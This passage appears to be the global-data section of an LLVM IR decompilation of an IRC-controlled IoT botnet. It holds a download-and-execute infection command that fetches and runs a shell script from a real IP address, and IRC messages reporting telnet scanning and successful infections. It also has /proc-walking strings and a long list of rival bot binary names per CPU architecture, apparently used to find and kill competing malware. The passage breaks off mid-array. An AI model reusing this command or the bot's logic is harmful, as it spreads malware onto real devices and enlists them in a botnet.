@global_var_80676f4.288 = constant [129 x i8] c"rm -rf /tmp/*; wget -q http://188.120.224.156/gtop.sh -O /tmp/gtop.sh; chmod 777 /tmp/gtop.sh; sh /tmp/gtop.sh; rm -rf /tmp/*.sh\00"
@global_var_806f074.289 = local_unnamed_addr global [129 x i8]* @global_var_80676f4.288
@global_var_806a2b4.290 = constant [70 x i8] c"PRIVMSG %s :[TELNET] [-] FAILED TO SEND TELNET PAYLOAD ---> %s:%s:%s\0A\00"
@global_var_806a2fc.291 = constant [53 x i8] c"PRIVMSG %s :[TELNET] [+] PAYLOAD SENT ---> %s:%s:%s\0A\00"
@global_var_8068ae2.292 = constant [11 x i8] c"ownloading\00"
@global_var_806f70c.293 = local_unnamed_addr global [11 x i8]* @global_var_8068ae2.292
@global_var_806a334.294 = constant [61 x i8] c"PRIVMSG %s :[TELNET] [+] SUCCESSFUL INFECTION ---> %s:%s:%s\0A\00"
@global_var_806a374.295 = constant [57 x i8] c"PRIVMSG %s :[TELNET] [-] FAILED TO INFECT ---> %s:%s:%s\0A\00"
@global_var_8074068.296 = local_unnamed_addr global i32 0
@global_var_806a3d0.297 = constant [29 x i8] c"NOTICE %s :SCANNER <ON/OFF>\0A\00"
@global_var_806a3ed.298 = constant [3 x i8] c"ON\00"
@global_var_806a3f0.300 = constant [43 x i8] c"PRIVMSG %s :[TELNET] [+] SCANNER STARTED!\0A\00"
@global_var_806a41c.301 = constant [51 x i8] c"PRIVMSG %s :[TELNET] [-] FAILED TO START SCANNER!\0A\00"
@global_var_806a450.302 = constant [51 x i8] c"PRIVMSG %s :[TELNET] [+] SCANNER ALREADY STARTED!\0A\00"
@global_var_806a483.303 = constant [4 x i8] c"OFF\00"
@global_var_806a488.304 = constant [42 x i8] c"PRIVMSG %s :[TELNET] [+] SCANNER KILLED!\0A\00"
@global_var_806a4b4.305 = constant [50 x i8] c"PRIVMSG %s :[TELNET] [-] FAILED TO KILL SCANNER!\0A\00"
@global_var_806a4e8.306 = constant [47 x i8] c"PRIVMSG %s :[TELNET] [+] SCANNER NOT STARTED!\0A\00"
@global_var_806a517.307 = constant [6 x i8] c"/proc\00"
@global_var_806a51d.308 = constant [17 x i8] c"can't open /proc\00"
@global_var_806a52e.309 = constant [18 x i8] c"/proc/%ld/cmdline\00"
@global_var_806a540.310 = constant i32 1882128416
@global_var_806a542.311 = constant [13 x i8] c"/proc/%i/exe\00"
@global_var_8067780.312 = constant [5 x i8] c"mips\00"
@global_var_8067785.313 = constant [7 x i8] c"mips64\00"
@global_var_806778c.314 = constant [7 x i8] c"mipsel\00"
@global_var_8067793.315 = constant [6 x i8] c"sh2eb\00"
@global_var_8067799.316 = constant [7 x i8] c"sh2elf\00"
@global_var_80677a0.317 = constant [4 x i8] c"sh4\00"
@global_var_80677a4.318 = constant [4 x i8] c"x86\00"
@global_var_80677a8.319 = constant [4 x i8] c"arm\00"
@global_var_80677ac.320 = constant [6 x i8] c"armv5\00"
@global_var_80677b2.321 = constant [8 x i8] c"armv4tl\00"
@global_var_80677ba.322 = constant [6 x i8] c"armv4\00"
@global_var_80677c0.323 = constant [6 x i8] c"armv6\00"
@global_var_80677c6.324 = constant [5 x i8] c"i686\00"
@global_var_80677cb.325 = constant [8 x i8] c"powerpc\00"
@global_var_80677d3.326 = constant [13 x i8] c"powerpc440fp\00"
@global_var_80677e0.327 = constant [5 x i8] c"i586\00"
@global_var_80677e5.328 = constant [5 x i8] c"m68k\00"
@global_var_80677ea.329 = constant [6 x i8] c"sparc\00"
@global_var_80677f0.330 = constant [7 x i8] c"x86_64\00"
@global_var_80677f7.331 = constant [11 x i8] c"jackmymips\00"
@global_var_8067802.332 = constant [13 x i8] c"jackmymips64\00"
@global_var_806780f.333 = constant [13 x i8] c"jackmymipsel\00"
@global_var_806781c.334 = constant [12 x i8] c"jackmysh2eb\00"
@global_var_8067828.335 = constant [13 x i8] c"jackmysh2elf\00"
@global_var_8067835.336 = constant [10 x i8] c"jackmysh4\00"
@global_var_806783f.337 = constant [10 x i8] c"jackmyx86\00"
@global_var_8067849.338 = constant [12 x i8] c"jackmyarmv5\00"
@global_var_8067855.339 = constant [14 x i8] c"jackmyarmv4tl\00"
@global_var_8067863.340 = constant [12 x i8] c"jackmyarmv4\00"
@global_var_806786f.341 = constant [12 x i8] c"jackmyarmv6\00"
@global_var_806787b.342 = constant [11 x i8] c"jackmyi686\00"
@global_var_8067886.343 = constant [14 x i8] c"jackmypowerpc\00"
@global_var_8067894.344 = constant [19 x i8] c"jackmypowerpc440fp\00"
@global_var_80678a7.345 = constant [11 x i8] c"jackmyi586\00"
@global_var_80678b2.346 = constant [11 x i8] c"jackmym68k\00"
@global_var_80678bd.347 = constant [12 x i8] c"jackmysparc\00"
@global_var_80678c9.348 = constant [13 x i8] c"jackmyx86_64\00"
@global_var_80678d6.349 = constant [11 x i8] c"hackmymips\00"
@global_var_80678e1.350 = constant [13 x i8] c"hackmymips64\00"
@global_var_80678ee.351 = constant [13 x i8] c"hackmymipsel\00"
@global_var_80678fb.352 = constant [12 x i8] c"hackmysh2eb\00"
@global_var_8067907.353 = constant [13 x i8] c"hackmysh2elf\00"
@global_var_8067914.354 = constant [10 x i8] c"hackmysh4\00"
@global_var_806791e.355 = constant [10 x i8] c"hackmyx86\00"
@global_var_8067928.356 = constant [12 x i8] c"hackmyarmv5\00"
@global_var_8067934.357 = constant [14 x i8] c"hackmyarmv4tl\00"
@global_var_8067942.358 = constant [12 x i8] c"hackmyarmv4\00"
@global_var_806794e.359 = constant [12 x i8] c"hackmyarmv6\00"
@global_var_806795a.360 = constant [11 x i8] c"hackmyi686\00"
@global_var_8067965.361 = constant [14 x i8] c"hackmypowerpc\00"
@global_var_8067973.362 = constant [19 x i8] c"hackmypowerpc440fp\00"
@global_var_8067986.363 = constant [11 x i8] c"hackmyi586\00"
@global_var_8067991.364 = constant [11 x i8] c"hackmym68k\00"
@global_var_806799c.365 = constant [12 x i8] c"hackmysparc\00"
@global_var_80679a8.366 = constant [13 x i8] c"hackmyx86_64\00"
@global_var_80679b5.367 = constant [3 x i8] c"b1\00"
@global_var_80679b8.368 = constant [3 x i8] c"b2\00"
@global_var_80679bb.369 = constant [3 x i8] c"b3\00"
@global_var_80679be.370 = constant [3 x i8] c"b4\00"
@global_var_80679c1.371 = constant [3 x i8] c"b5\00"
@global_var_80679c4.372 = constant [3 x i8] c"b6\00"
@global_var_80679c7.373 = constant [3 x i8] c"b7\00"
@global_var_80679ca.374 = constant [3 x i8] c"b8\00"
@global_var_80679cd.375 = constant [3 x i8] c"b9\00"
@global_var_80679d0.376 = constant [4 x i8] c"b10\00"
@global_var_80679d4.377 = constant [4 x i8] c"b11\00"
@global_var_80679d8.378 = constant [4 x i8] c"b12\00"
@global_var_80679dc.379 = constant [4 x i8] c"b13\00"
@global_var_80679e0.380 = constant [4 x i8] c"b14\00"
@global_var_80679e4.381 = constant [4 x i8] c"b15\00"
@global_var_80679e8.382 = constant [4 x i8] c"b16\00"
@global_var_80679ec.383 = constant [4 x i8] c"b17\00"
@global_var_80679f0.384 = constant [4 x i8] c"b18\00"
@global_var_80679f4.385 = constant [4 x i8] c"b19\00"
@global_var_80679f8.386 = constant [4 x i8] c"b20\00"
@global_var_80679fc.387 = constant [17 x i8] c"busyboxterrorist\00"
@global_var_8067a0d.388 = constant [10 x i8] c"dvrHelper\00"
@global_var_8067a17.389 = constant [8 x i8] c"kmymips\00"
@global_var_8067a1f.390 = constant [10 x i8] c"kmymips64\00"
@global_var_8067a29.391 = constant [10 x i8] c"kmymipsel\00"
@global_var_8067a33.392 = constant [9 x i8] c"kmysh2eb\00"
@global_var_8067a3c.393 = constant [10 x i8] c"kmysh2elf\00"
@global_var_8067a46.394 = constant [7 x i8] c"kmysh4\00"
@global_var_8067a4d.395 = constant [7 x i8] c"kmyx86\00"
@global_var_8067a54.396 = constant [9 x i8] c"kmyarmv5\00"
@global_var_8067a5d.397 = constant [11 x i8] c"kmyarmv4tl\00"
@global_var_8067a68.398 = constant [9 x i8] c"kmyarmv4\00"
@global_var_8067a71.399 = constant [9 x i8] c"kmyarmv6\00"
@global_var_8067a7a.400 = constant [8 x i8] c"kmyi686\00"
@global_var_8067a82.401 = constant [11 x i8] c"kmypowerpc\00"
@global_var_8067a8d.402 = constant [16 x i8] c"kmypowerpc440fp\00"
@global_var_8067a9d.403 = constant [8 x i8] c"kmyi586\00"
@global_var_8067aa5.404 = constant [8 x i8] c"kmym68k\00"
@global_var_8067aad.405 = constant [9 x i8] c"kmysparc\00"
@global_var_8067ab6.406 = constant [10 x i8] c"kmyx86_64\00"
@global_var_8067ac0.407 = constant [8 x i8] c"lolmips\00"
@global_var_8067ac8.408 = constant [10 x i8] c"lolmips64\00"
@global_var_8067ad2.409 = constant [10 x i8] c"lolmipsel\00"
@global_var_8067adc.410 = constant [9 x i8] c"lolsh2eb\00"
@global_var_8067ae5.411 = constant [10 x i8] c"lolsh2elf\00"
@global_var_8067aef.412 = constant [7 x i8] c"lolsh4\00"
@global_var_8067af6.413 = constant [7 x i8] c"lolx86\00"
@global_var_8067afd.414 = constant [9 x i8] c"lolarmv5\00"
@global_var_8067b06.415 = constant [11 x i8] c"lolarmv4tl\00"
@global_var_8067b11.416 = constant [9 x i8] c"lolarmv4\00"
@global_var_8067b1a.417 = constant [9 x i8] c"lolarmv6\00"
@global_var_8067b23.418 = constant [8 x i8] c"loli686\00"
@global_var_8067b2b.419 = constant [11 x i8] c"lolpowerpc\00"
@global_var_8067b36.420 = constant [16 x i8] c"lolpowerpc440fp\00"
@global_var_8067b46.421 = constant [8 x i8] c"loli586\00"
@global_var_8067b4e.422 = constant [8 x i8] c"lolm68k\00"
@global_var_8067b56.423 = constant [9 x i8] c"lolsparc\00"
@global_var_8067b5f.424 = constant [8 x i8] c"telmips\00"
@global_var_8067b67.425 = constant [10 x i8] c"telmips64\00"
@global_var_8067b71.426 = constant [10 x i8] c"telmipsel\00"
@global_var_8067b7b.427 = constant [9 x i8] c"telsh2eb\00"
@global_var_8067b84.428 = constant [10 x i8] c"telsh2elf\00"
@global_var_8067b8e.429 = constant [7 x i8] c"telsh4\00"
@global_var_8067b95.430 = constant [7 x i8] c"telx86\00"
@global_var_8067b9c.431 = constant [9 x i8] c"telarmv5\00"
@global_var_8067ba5.432 = constant [11 x i8] c"telarmv4tl\00"
@global_var_8067bb0.433 = constant [9 x i8] c"telarmv4\00"
@global_var_8067bb9.434 = constant [9 x i8] c"telarmv6\00"
@global_var_8067bc2.435 = constant [8 x i8] c"teli686\00"
@global_var_8067bca.436 = constant [11 x i8] c"telpowerpc\00"
@global_var_8067bd5.437 = constant [16 x i8] c"telpowerpc440fp\00"
@global_var_8067be5.438 = constant [8 x i8] c"teli586\00"
@global_var_8067bed.439 = constant [8 x i8] c"telm68k\00"
@global_var_8067bf5.440 = constant [9 x i8] c"telsparc\00"
@global_var_8067bfe.441 = constant [10 x i8] c"telx86_64\00"
@global_var_8067c08.442 = constant [12 x i8] c"TwoFacemips\00"
@global_var_8067c14.443 = constant [14 x i8] c"TwoFacemips64\00"
@global_var_8067c22.444 = constant [14 x i8] c"TwoFacemipsel\00"
@global_var_8067c30.445 = constant [13 x i8] c"TwoFacesh2eb\00"
@global_var_8067c3d.446 = constant [14 x i8] c"TwoFacesh2elf\00"
@global_var_8067c4b.447 = constant [11 x i8] c"TwoFacesh4\00"
@global_var_8067c56.448 = constant [11 x i8] c"TwoFacex86\00"
@global_var_8067c61.449 = constant [13 x i8] c"TwoFacearmv5\00"
@global_var_8067c6e.450 = constant [15 x i8] c"TwoFacearmv4tl\00"
@global_var_8067c7d.451 = constant [13 x i8] c"TwoFacearmv4\00"
@global_var_8067c8a.452 = constant [13 x i8] c"TwoFacearmv6\00"
@global_var_8067c97.453 = constant [12 x i8] c"TwoFacei686\00"
@global_var_8067ca3.454 = constant [15 x i8] c"TwoFacepowerpc\00"
@global_var_8067cb2.455 = constant [20 x i8] c"TwoFacepowerpc440fp\00"
@global_var_8067cc6.456 = constant [12 x i8] c"TwoFacei586\00"
@global_var_8067cd2.457 = constant [12 x i8] c"TwoFacem68k\00"
@global_var_8067cde.458 = constant [13 x i8] c"TwoFacesparc\00"
@global_var_8067ceb.459 = constant [14 x i8] c"TwoFacex86_64\00"
@global_var_8067cf9.460 = constant [5 x i8] c"xxb1\00"
@global_var_8067cfe.461 = constant [5 x i8] c"xxb2\00"
@global_var_8067d03.462 = constant [5 x i8] c"xxb3\00"
@global_var_8067d08.463 = constant [5 x i8] c"xxb4\00"
@global_var_8067d0d.464 = constant [5 x i8] c"xxb5\00"
@global_var_8067d12.465 = constant [5 x i8] c"xxb6\00"
@global_var_8067d17.466 = constant [5 x i8] c"xxb7\00"
@global_var_8067d1c.467 = constant [5 x i8] c"xxb8\00"
@global_var_8067d21.468 = constant [5 x i8] c"xxb9\00"
@global_var_8067d26.469 = constant [6 x i8] c"xxb10\00"
@global_var_8067d2c.470 = constant [6 x i8] c"xxb11\00"
@global_var_8067d32.471 = constant [6 x i8] c"xxb12\00"
@global_var_8067d38.472 = constant [6 x i8] c"xxb13\00"
@global_var_8067d3e.473 = constant [6 x i8] c"xxb14\00"
@global_var_8067d44.474 = constant [6 x i8] c"xxb15\00"
@global_var_8067d4a.475 = constant [6 x i8] c"xxb16\00"
@global_var_8067d50.476 = constant [6 x i8] c"xxb17\00"
@global_var_8067d56.477 = constant [6 x i8] c"xxb18\00"
@global_var_8067d5c.478 = constant [6 x i8] c"xxb19\00"
@global_var_8067d62.479 = constant [6 x i8] c"xxb20\00"
@global_var_8067d68.480 = constant [3 x i8] c"bb\00"
@global_var_8067d6b.481 = constant [11 x i8] c"busybotnet\00"
@global_var_8067d7e.482 = constant [3 x i8] c"B1\00"
@global_var_8067d81.483 = constant [3 x i8] c"B2\00"
@global_var_8067d84.484 = constant [3 x i8] c"B3\00"
@global_var_8067d87.485 = constant [3 x i8] c"B4\00"
@global_var_8067d8a.486 = constant [3 x i8] c"B5\00"
@global_var_8067d8d.487 = constant [3 x i8] c"B6\00"
@global_var_8067d90.488 = constant [3 x i8] c"B7\00"
@global_var_8067d93.489 = constant [3 x i8] c"B8\00"
@global_var_8067d96.490 = constant [3 x i8] c"B9\00"
@global_var_8067d99.491 = constant [4 x i8] c"B10\00"
@global_var_8067d9d.492 = constant [4 x i8] c"B11\00"
@global_var_8067da1.493 = constant [4 x i8] c"B12\00"
@global_var_8067da5.494 = constant [4 x i8] c"B13\00"
@global_var_8067da9.495 = constant [4 x i8] c"B14\00"
@global_var_8067dad.496 = constant [4 x i8] c"B15\00"
@global_var_8067db1.497 = constant [4 x i8] c"B16\00"
@global_var_8067db5.498 = constant [4 x i8] c"B17\00"
@global_var_8067db9.499 = constant [4 x i8] c"B18\00"
@global_var_8067dbd.500 = constant [4 x i8] c"B20\00"
@global_var_8067dc1.501 = constant [7 x i8] c"gaybot\00"
@global_var_806f080.502 = global [191 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8067780.312, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8067785.313, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_806778c.314, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8067793.315, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8067799.316, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80677a0.317, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80677a4.318, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80677a8.319, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80677ac.320, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80677b2.321, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80677ba.322, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80677c0.323, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80677c6.324, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80677cb.325, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_80677d3.326, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80677e0.327, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80677e5.328, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80677ea.329, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80677f0.330, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_80677f7.331, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8067802.332, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_806780f.333, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_806781c.334, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8067828.335, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8067835.336, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_806783f.337, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8067849.338, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8067855.339, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8067863.340, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_806786f.341, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_806787b.342, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8067886.343, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_8067894.344, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_80678a7.345, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_80678b2.346, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_80678bd.347, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_80678c9.348, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_80678d6.349, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_80678e1.350, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_80678ee.351, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_80678fb.352, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8067907.353, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8067914.354, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_806791e.355, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8067928.356, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8067934.357, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8067942.358, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_806794e.359, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_806795a.360, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8067965.361, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_8067973.362, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8067986.363, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8067991.364, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_806799c.365, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_80679a8.366, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80679b5.367, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80679b8.368, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80679bb.369, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80679be.370, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80679c1.371, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80679c4.372, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80679c7.373, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80679ca.374, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80679cd.375, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80679d0.376, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80679d4.377, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80679d8.378, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80679dc.379, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80679e0.380, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80679e4.381, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80679e8.382, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80679ec.383, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80679f0.384, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80679f4.385, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80679f8.386, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_80679fc.387, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8067a0d.388, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8067a17.389, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8067a1f.390, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8067a29.391, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8067a33.392, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8067a3c.393, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8067a46.394, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8067a4d.395, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8067a54.396, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8067a5d.397, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8067a68.398, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8067a71.399, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8067a7a.400, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8067a82.401, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_8067a8d.402, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8067a9d.403, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8067aa5.404, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8067aad.405, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8067ab6.406, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8067ac0.407, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8067ac8.408, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8067ad2.409, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8067adc.410, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8067ae5.411, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8067aef.412, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8067af6.413, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8067afd.414, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8067b06.415, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8067b11.416, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8067b1a.417, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8067b23.418, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8067b2b.419, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_8067b36.420, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8067b46.421, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8067b4e.422, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8067b56.423, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8067b5f.424, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8067b67.425, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8067b71.426, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8067b7b.427, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8067b84.428, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8067b8e.429, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8067b95.430, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8067b9c.431, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8067ba5.432, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8067bb0.433, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8067bb9.434, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8067bc2.435, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8067bca.436, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_8067bd5.437, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8067be5.438, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8067bed.439, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8067bf5.440, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8067bfe.441, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8067c08.442, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8067c14.443, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8067c22.444, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8067c30.445, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8067c3d.446, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8067c4b.447, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8067c56.448, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8067c61.449, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_8067c6e.450, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8067c7d.451, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8067c8a.452, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8067c97.453, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_8067ca3.454, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_8067cb2.455, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8067cc6.456, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8067cd2.457, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8067cde.458, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8067ceb.459, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8067cf9.460, i32 0, 